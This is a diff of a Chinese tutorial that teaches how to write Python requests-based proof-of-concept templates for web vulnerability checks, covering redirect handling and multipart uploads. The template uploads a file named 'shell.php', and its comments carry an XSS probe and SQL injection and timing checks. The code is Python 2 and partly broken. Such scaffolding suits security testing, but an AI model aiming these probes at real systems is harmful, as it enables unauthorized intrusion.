+​
+# 返回包
+HTTP 302 OK
+location: /home.php
+// 如果错误：
+// location: /login.php?error=fail
+​
+# 类似这样：
+# <script>location="/home.php"</script>
+```
+
+针对上述情况，可了解一下requests库中的`allow_redirects`字段，默认为True，也就是允许跳转，若设置为False，也就是不跳转，此时打印请求的响应头，即为302或者301等
+
+在脚本中，可以这样写：
+
+```python
+import requests
+# 普通传参
+data = "name=admin&pass=admin"
+req = requests.post(url, data=data, allow_redirects=False)
+if req.status_code == 302 and "home.php" in req.headers['location']: xxx
+# 分段传参：
+data = {
+    'name': (None, 'admin'),
+    'pass': (None, 'admin'),}
+req = requests.post(url, files=data, allow_redirects=False)
+if req.status_code == 302 and "home.php" in req.headers['location']: xxx
+# json传参：与普通传参类似
+data = '{"name":"admin","pass":"admin"}'
+req = requests.post(url, data=data, allow_redirects=False)
+if req.status_code == 302 and "home.php" in req.headers['location']: xxx
+```
+
+#### 来一个示例看看
 
 ```python
 # -*- coding: utf-8 -*-
-import random,string,hashlib
+​
+import requests,random,hashlib
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))
-
-yuju = str(random.randint(0, 999999))
-mdfive = hashlib.md5(yuju).hexdigest()
+# FROM:
+# FOFA：
+# VERSION:
+#
+​
+def verify(target):
+    # 检测SQL注入以及XSS，文件写入等，可使用随机数
+    yuju = str(random.randint(0, 999999))
+    mdfive = hashlib.md5(yuju).hexdigest()
+    path = ""
+    url = target + path
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+        # "Cookie":config.conf['cookie'],
+        # "": "",
+        # "": "",
+        # "": "",
+        "Content-Type": "application/x-www-form-urlencoded",
+        }
+    data = ""
+    # 文件上传时使用，或传递特殊形式参数使用
+    file = {
+        'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
+        'file[]': ('shell.php', data, 'application/octet-stream'),
+        'name2': (None, 'huan'),
+        None: ('haha', 'ni'),
+        None: ('xixi', 'ya'),
+​
+        }
+​
+    try:
+       req = requests.post(url, headers=headers, data=data, files=file, timeout=10, verify=False, allow_redirects=False)
+       # 调试语句
+       print req.status_code
+       print req.headers
+       print req.text
+       exit(0)
+       if '' in req.text and '' in req.headers[''] and req.status_code == 200:
+           print "success"
+    except Exception, e:
+        print str(e)
+    return self.result
+​
+​
+verify("")
+# sqli  :  mdfive = hashlib.md5(yuju).hexdigest()
+# xss      <script>alert(yuju)</script>
+# import time; now = time.time() sendtime = time.time()-now
+# proxy={"http": "http://127.0.0.1:8081","https": "https://127.0.0.1:8081"}
 ```
 
- 在上述的代码中，yuju为0-999999之间的随机数，而mdfive被定义为了yuju的MD5值。而此时：
+示例可作为模板使用，会节约下来很多时间
 
-1、在测试XSS中，可以使用alert\(yuju\) 来判断，SQL注入也可以使用查询yuju的MD5值来判断注入。  
-2、在文件上传时，若将文件名设置为随机数，并将随机数的MD5值涵盖进文件内容中，可减少误报率
+### 示例答疑
 
- 同时，时间戳也是同理：
+* 这个示例有什么用？
 
-```python
-import time
+> 这个示例首先是用来节约时间的，如果是GET发包，则可以直接将示例中的data,file等字段删掉，并将`requests.post`改为`requests.get`即可
 
-noww = int(time.time())
-now = str(noww)
-print now
+* 单次发包后，当把print返回包响应信息的语句去掉后，为什么还是不能打印`self.result`?
 
-payloads = "/assets/config/config%s.json" % now
-```
+> 可尝试查看`self.result['target']`与`self.result['data']`是否赋予了正确的值。若请求中URL部分没有`?`，可在下方却设置了`self.result['target'] = url.split('?')[0]`，那就不会打印集合了。 同理，data的字段也应当定义为发包时的数据
 
-### 7，未完待续
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
--
+* 最后，写完脚本后**记得删掉没必要的部分**，**记得删掉没必要的部分**，**记得删掉没必要的部分**！！！
 
 
 
